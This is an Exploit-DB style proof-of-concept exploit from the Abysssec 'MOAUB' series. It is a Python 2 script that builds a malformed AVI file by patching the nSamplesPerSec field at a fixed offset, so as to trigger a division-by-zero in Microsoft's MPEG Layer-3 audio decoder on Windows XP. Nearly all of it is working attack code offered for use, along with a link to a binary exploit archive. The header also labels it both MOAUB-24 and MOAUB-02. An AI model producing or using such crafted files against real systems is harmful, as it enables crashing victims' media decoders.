'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/moaub-24-microsoft-mpeg-layer-3-audio-decoder-division-by-zero/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15096.zip (moaub-24-mp3-exploit.zip)
'''

'''
  Title            :  Microsoft MPEG Layer-3 Audio Decoder Division By Zero
  Version          :  l3codeca.acm 1-9-0-306 (XP SP2 ñ XP SP3)
  Analysis        :  http://www.abysssec.com
  Vendor           :  http://www.microsoft.com
  Impact           :  Med/High
  Contact          :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter          :  @abysssec
  MOAUB Number     :  MOAUB-02
'''

import sys
import struct


def main():
   
    try:
		fdR = open('src.avi', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:4428]
		nSamplesPerSecField = '\x00\xff\xff\xff'
		str2 = strTotal[4432:]
		
		fdW= open('poc.avi', 'wb+')
		fdW.write(str1)
		fdW.write(nSamplesPerSecField)
		fdW.write(str2)
		fdW.close()
		fdR.close()
		print '[-] AVI file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()